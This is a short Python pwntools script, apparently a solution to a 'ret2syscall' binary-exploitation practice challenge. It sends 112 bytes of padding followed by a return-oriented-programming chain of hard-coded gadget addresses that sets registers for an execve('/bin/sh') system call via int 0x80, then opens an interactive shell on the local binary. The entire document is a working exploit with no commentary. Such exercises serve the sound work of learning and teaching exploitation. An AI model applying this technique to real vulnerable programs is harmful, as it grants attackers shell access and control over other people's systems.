from pwn import *

pop_eax_ret_addr = 0x080BB196
pop_ecx_ebx_ret_addr = 0x0806EB91
pop_edx_ret_addr = 0x0806EB6A
int_80_addr = 0x08049421
bin_sh_addr = 0x080BE408
offset = 112
payload = flat(
    [
        offset * b"A",
        pop_eax_ret_addr,
        0xB,
        pop_ecx_ebx_ret_addr,
        0,
        bin_sh_addr,
        pop_edx_ret_addr,
        0,
        int_80_addr,
    ]
)
sh = process("./ret2syscall")
sh.sendline(payload)
sh.interactive()
